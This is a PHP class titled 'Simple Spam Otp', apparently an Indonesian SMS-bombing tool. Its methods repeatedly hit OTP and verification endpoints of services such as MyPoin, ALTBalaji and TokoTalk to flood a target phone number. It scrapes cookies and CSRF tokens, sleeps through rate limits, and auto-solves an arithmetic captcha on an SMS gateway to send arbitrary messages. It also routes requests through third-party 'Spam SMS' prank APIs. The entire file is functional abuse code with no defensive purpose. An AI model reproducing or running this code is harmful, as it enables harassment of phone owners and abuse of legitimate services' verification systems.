<?php
namespace SimpleSpam;

class Otp {
	/*
	* Name : Simple Spam Otp
	* File : otp.php
	* Author : DulLah
	* Github : https://github.com/dz-id
	* Telegram : https://t.me/unikers
	* Date : 26-01-2020
	* Version : 1.0
	*/
	protected static $agent;

	function __construct() {
		self::$agent = "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36";
		ini_set("max_execution_time", 0);
		ini_set("memory_limit", "99999M");
		set_time_limit(0);
	}

	private function GetCookieMyPoin() {
		$ch = curl_init("https://mypoin.id/register/validate-phone-number");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, self::$agent);
		$html = curl_exec($ch);
		$fields = array();
		curl_close($ch);
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $html, $cookie);
		foreach ($cookie[1] as $kuki) {
			array_push($fields, $kuki);
		}

		$dom = new \DomDocument();
		@$dom->loadHTML($html);

		$tag = $dom->getElementsByTagName("input");
		foreach ($tag as $token) {

			$csr = $token->getAttribute("name");

			if (strpos($csr, "csrfmiddlewaretoken") !==False) {
				array_push($fields, $token->getAttribute("value"));
				break;
			}
		}
		return $fields;
	}

	public function MyPoin($nomor, $loop) {
		$cookie = self::GetCookieMyPoin();
		$param = array(
			"phone" => $nomor,
			"csrfmiddlewaretoken" => $cookie[2]
		);
		$headers = array(
			"Host: mypoin.id",
			"Connection: keep-alive",
			"Sec-Fetch-Site: same-origin",
			"Sec-Fetch-Mode: cors",
			"Accept: application/json, text/javascript, */*; q=0.01",
			"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
			"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,nb;q=0.6",
			"Origin: https://mypoin.id",
			"X-Requested-With: XMLHttpRequest",
			"Referer: https://mypoin.id/register/validate-phone-number",
			"Cookie: $cookie[0]; _ga=GA1.2.1152780872.1579970310; _gid=GA1.2.1621783.1579970310; $cookie[1]; _gat_gtag_UA_108385159_1=1"
		);

		for ($i = 0; $i < $loop; $i++) {
			$ch = curl_init("https://mypoin.id/register/request-otp");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($param));
			curl_setopt($ch, CURLOPT_USERAGENT, self::$agent);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			$response = curl_exec($ch);
			curl_close($ch);

			if (strpos($response, "ok") !==False) {
				echo "\e[92m[$i] \e[0mTerkirim!\n";

			} else if (strpos($response, "1 menit") !==False) {
				echo "\e[91m[$i] \e[0mTunggu 1 Menit Gan\n";
				sleep(60);

			} else {
				echo "\e[91m[$i] \e[0mGagal!\n";
			}
		}
	}

	public function AltBaljai($nomor, $loop) {
		$enc = json_encode([
			"country_code" => "62",
			"phone_number" => substr($nomor, 2, 13),
		]);

		$headers = [
			"User-Agent: ".self::$agent,
			"Content-Type: application/json;charset=UTF-8",
			"Content-Length: ".strlen($enc),
		];
		for ($i = 0; $i < $loop; $i++) {
			$ch = curl_init("https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $enc);
			curl_setopt($ch, CURLOPT_USERAGENT, self::$agent);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			$response = curl_exec($ch);
			curl_close($ch);
			$response = json_decode($response, true);
			if ($response["status"] !== "error") {
				echo "\e[92m[$i] \e[0mTerkirim!\n";

			} else if ($response["message"] == "SMS limit exceeded") {
				echo "\e[91m[$i] \e[0mLimit gan awokawok!\n";

			} else {
				echo "\e[91m[$i] \e[0mGagal!\n";
			}
		}
	}

	private function GetKeyPayuTerus() {
		$ch = curl_init("http://sms.payuterus.biz/alpha/?a=keluar");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_USERAGENT, self::$agent);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			"Referer: http://sms.payuterus.biz/alpha/send.php",
			"User-Agent: ".self::$agent,
		));
		$keys = array();
		$html = curl_exec($ch);
		curl_close($ch);
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $html, $cookie);
		preg_match('/name=\"key\" value=\"(.*?)\">/', $html, $key);
		preg_match('/<span>(.*?) = /', $html, $bypass);
		$jml = explode(" + ", $bypass[1]);
		$jml = $jml[0]+$jml[1];
		array_push($keys, array(
			"cookie" => $cookie[1][0]."; ".$cookie[1][1],
			"jumlah" => $jml,
			"key" => $key[1],
		));
		return $keys[0];
	}

	public function SmsPayuTerusBis($nomor, $msg) {
		$keys = self::GetKeyPayuTerus();

		$form = array(
			"nohp" => $nomor,
			"pesan" => $msg,
			"captcha" => $keys["jumlah"],
			"key" => $keys["key"]
		);
		$headers = array(
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
			"Referer: http://sms.payuterus.biz/alpha/",
			"Origin: http://sms.payuterus.biz",
			"Pragma: no-cache",
			"Cache-Control: no-cache",
			"Connection: keep-alive",
			"Content-Type: application/x-www-form-urlencoded",
			"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,nb;q=0.6",
			"Cookie: ".$keys["cookie"],
			"User-Agent: ".self::$agent,
		);

		$ch = curl_init("http://sms.payuterus.biz/alpha/send.php");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($form));
		curl_setopt($ch, CURLOPT_USERAGENT, self::$agent);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		$send = curl_exec($ch);
		curl_close($ch);
		return $send;
	}

	public function TokoTalk($nomor, $loop) {
		$headers = array(
			"User-Agent: ".self::$agent,
			"Accept: application/json, text/plain, */*",
			"Host: masterkadal.com",
			"Referer: https://masterkadal.com/tools/tokotalk/",
			"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,nb;q=0.6",
			"Sec-Fetch-Site: same-origin",
			"Sec-Fetch-Mode: cors",
			"Connection: keep-alive"
		);
		for ($i = 0; $i < $loop; $i++) {
			$ch = curl_init("https://masterkadal.com/api/tokotalk/?nomer=$nomor");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_USERAGENT, self::$agent);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			$response = curl_exec($ch);
			curl_close($ch);
			if (strpos($response, "SMS sukses")) {
				echo "\e[92m[$i]\e[0m Terkirim\n";

			} else {
				echo "\e[91m[$i]\e[0m Gagal\n";
			}
		}
	}

	private function Post($data, $headers, $loop, $api) {

		for ($i = 0; $i < $loop; $i++) {
			$ch = curl_init($api);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
			curl_setopt($ch, CURLOPT_USERAGENT, self::$agent);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			$response = curl_exec($ch);
			curl_close($ch);
			if (strpos($response, "Terkirim")) {
				echo "\e[92m[$i]\e[0m Terkirim\n";

			} else {
				echo "\e[91m[$i]\e[0m Gagal\n";
			}
		}
	}

	public function Other($nomor, $loop, $type) {
		if ($type == "OyoHotels") {
			self::Post(
				array(
					"nomor" => $nomor,
					"jumlah" => "1",
				),
				array(
					"User-Agent: ".self::$agent,
					"X-Requested-With: XMLHttpRequest",
					"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
					"Origin: https://nabill.me",
					"Accept: */*",
					"Host: nabill.me",
					"Sec-Fetch-Site: same-origin",
					"Sec-Fetch-Mode: cors",
					"Referer: https://nabill.me/Spam_SMS_Oyo",
					"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,nb;q=0.6",
					"Connection: keep-alive"
				),
				$loop, "https://nabill.me/Tools/Prank-Tools/Spam-SMS-Oyo/api.php"
			);
		} else if ($type == "AyoSrc") {
			self::Post(
				array(
					"nomor" => $nomor,
					"jumlah" => "1",
				),
				array(
					"User-Agent: ".self::$agent,
					"X-Requested-With: XMLHttpRequest",
					"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
					"Origin: https://nabill.me",
					"Accept: */*",
					"Host: nabill.me",
					"Sec-Fetch-Site: same-origin",
					"Sec-Fetch-Mode: cors",
					"Referer: https://nabill.me/Ayo_Src_Bom",
					"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,nb;q=0.6",
					"Connection: keep-alive"
				),
				$loop, "https://nabill.me/Tools/Prank-Tools/Ayo-Src/api.php"
			);
		} else if ($type == "CodaShopTsel") {
			self::Post(
				array(
					"nomor" => $nomor,
					"jumlah" => "1",
				),
				array(
					"User-Agent: ".self::$agent,
					"X-Requested-With: XMLHttpRequest",
					"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
					"Origin: https://nabill.me",
					"Accept: */*",
					"Host: nabill.me",
					"Sec-Fetch-Site: same-origin",
					"Sec-Fetch-Mode: cors",
					"Referer: https://nabill.me/Codashop_Spam_Telkomsel",
					"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,nb;q=0.6",
					"Connection: keep-alive"
				),
				$loop, "https://nabill.me/Tools/Prank-Tools/Codashop-Spam-Telkomsel/api.php"
			);
		}
	}
} ?>